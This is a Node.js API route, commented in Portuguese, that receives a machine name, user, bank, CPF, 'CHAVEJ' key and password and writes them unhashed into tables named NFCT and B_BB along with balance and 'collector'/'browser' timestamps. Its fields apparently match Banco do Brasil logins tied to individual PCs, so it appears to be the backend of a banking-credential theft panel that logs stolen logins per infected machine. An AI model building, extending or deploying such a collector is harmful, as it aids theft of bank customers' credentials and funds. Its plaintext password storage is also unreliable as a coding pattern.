const { sequelize } = require('../../models');

async function handleCreateOrUpdate(req, res) {
  const { PC, USER, BANCO, STATUSRESUMO, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA } = req.body;

  if (!PC || !USER || !BANCO || !STATUSRESUMO || !PERFIL || !TIPOACESSO || !SENHA) {
    return res.status(400).json({ message: 'Todos os campos são obrigatórios' });
  }

  const dtInclusao = new Date().toISOString().slice(0, 19).replace('T', ' ');

  try {
    // Verificar se o registro já existe na tabela NFCT
    const [nfctRecord] = await sequelize.query(
      `SELECT id FROM NFCT WHERE PC = :PC AND USER = :USER`,
      {
        replacements: { PC, USER },
        type: sequelize.QueryTypes.SELECT
      }
    );

    let nfctId;

    if (nfctRecord && nfctRecord.id) {
      nfctId = nfctRecord.id;
    } else {
      // Inserir novo registro em NFCT
      const [insertResult] = await sequelize.query(
        `INSERT INTO NFCT (PC, USER, BANCO, STATUSRESUMO) VALUES (:PC, :USER, :BANCO, :STATUSRESUMO)`,
        {
          replacements: { PC, USER, BANCO, STATUSRESUMO },
          type: sequelize.QueryTypes.INSERT
        }
      );

      nfctId = insertResult;
    }

    // Inserir registro na tabela B_BB
    await sequelize.query(
      `INSERT INTO B_BB (FK_ID_NFCT, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA, DT_INCLUSAO, SALDO, TOTAL, DT_COLLECTOR, DT_BROWSER)
       VALUES (:FK_ID_NFCT, :PERFIL, :TIPOACESSO, :CHAVEJ, :CPF, :SENHA, :DT_INCLUSAO, 0, 0, NOW(), NOW())`,
      {
        replacements: { FK_ID_NFCT: nfctId, PERFIL, TIPOACESSO, CHAVEJ, CPF, SENHA, DT_INCLUSAO: dtInclusao },
        type: sequelize.QueryTypes.INSERT
      }
    );

    res.status(200).json({ message: 'Registros inseridos com sucesso' });
  } catch (error) {
    console.error('Erro ao criar registros:', error.message);
    res.status(500).json({ error: error.message });
  }
}

export default async function handler(req, res) {
  if (req.method === 'POST') {
    await handleCreateOrUpdate(req, res);
  } else {
    res.status(405).json({ message: 'Method not allowed' });
  }
}
